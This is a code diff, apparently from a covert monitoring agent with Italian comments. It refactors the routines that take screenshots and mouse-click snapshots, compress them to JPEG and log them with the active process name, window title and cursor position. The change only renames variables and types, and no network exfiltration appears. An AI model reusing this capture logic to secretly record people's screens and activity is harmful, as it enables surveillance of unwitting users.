@@ -155,7 +155,6 @@ static BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD qu
 
 void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
 {
-	HANDLE hf;
 	BITMAPFILEHEADER bmf = { };
 	BYTE *source_bmp = NULL, *dest_jpg = NULL;
 	DWORD bmp_size, jpg_size;
@@ -176,9 +175,9 @@ void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len,
 	memcpy(source_bmp+sizeof(bmf)+cbBMI, pData, cbData);
 
 	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size, quality)) {
-		hf = Log_CreateFile(agent_tag, additional_header, additional_len);
-		Log_WriteFile(hf, (BYTE *)dest_jpg, jpg_size);
-		Log_CloseFile(hf);				
+		HANDLE hFile = Log_CreateFile(agent_tag, additional_header, additional_len);
+		Log_WriteFile(hFile, (BYTE *)dest_jpg, jpg_size);
+		Log_CloseFile(hFile);				
 	}
 	
 	SAFE_FREE(source_bmp);
@@ -317,7 +316,7 @@ void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality)
 		//Prende il nome della finestra e del processo per scriverlo nell'header
 		DWORD dwProcessId = 0;
 		WCHAR *proc_name = NULL;
-		SnapshotAdditionalData *snap_additional_header;
+		SNASHOT_DATA *snap_additional_header;
 		BYTE *log_header;
 		DWORD additional_len;
 
@@ -325,15 +324,15 @@ void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality)
 		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
 			proc_name = wcsdup(L"UNKNOWN");
 
-		additional_len = sizeof(SnapshotAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
+		additional_len = sizeof(SNASHOT_DATA) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
 		log_header = (BYTE *)malloc(additional_len);
 		if (log_header) {
 			// Crea l'header addizionale
-			snap_additional_header = (SnapshotAdditionalData *)log_header;
+			snap_additional_header = (SNASHOT_DATA *)log_header;
 			snap_additional_header->uVersion = LOG_SNAP_VERSION;
 			snap_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
 			snap_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
-			log_header+=sizeof(SnapshotAdditionalData);
+			log_header+=sizeof(SNASHOT_DATA);
 			memcpy(log_header, proc_name, snap_additional_header->uProcessNameLen);
 			log_header+=snap_additional_header->uProcessNameLen;
 			memcpy(log_header, svTitle, snap_additional_header->uWindowNameLen);
@@ -374,7 +373,7 @@ void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD 
 
 	DWORD dwProcessId = 0;
 	WCHAR *proc_name = NULL;
-	MouseAdditionalData *mouse_additional_header; 
+	MOUSE_DATA *mouse_additional_header; 
 	BYTE *log_header;
 	DWORD additional_len;
 
@@ -449,11 +448,11 @@ void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD 
 		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
 			proc_name = wcsdup(L"UNKNOWN");
 
-		additional_len = sizeof(MouseAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
+		additional_len = sizeof(MOUSE_DATA) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
 		log_header = (BYTE *)malloc(additional_len);
 		if (log_header) {
 			// Crea l'header addizionale
-			mouse_additional_header = (MouseAdditionalData *)log_header;
+			mouse_additional_header = (MOUSE_DATA *)log_header;
 			mouse_additional_header->uVersion = LOG_MOUSE_VERSION;
 			mouse_additional_header->xPos = abs_x;
 			mouse_additional_header->yPos = abs_y;
@@ -461,7 +460,7 @@ void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD 
 			mouse_additional_header->max_y = GetSystemMetrics(SM_CYSCREEN);
 			mouse_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
 			mouse_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
-			log_header+=sizeof(MouseAdditionalData);
+			log_header+=sizeof(MOUSE_DATA);
 			memcpy(log_header, proc_name, mouse_additional_header->uProcessNameLen);
 			log_header+=mouse_additional_header->uProcessNameLen;
 			memcpy(log_header, svTitle, mouse_additional_header->uWindowNameLen);
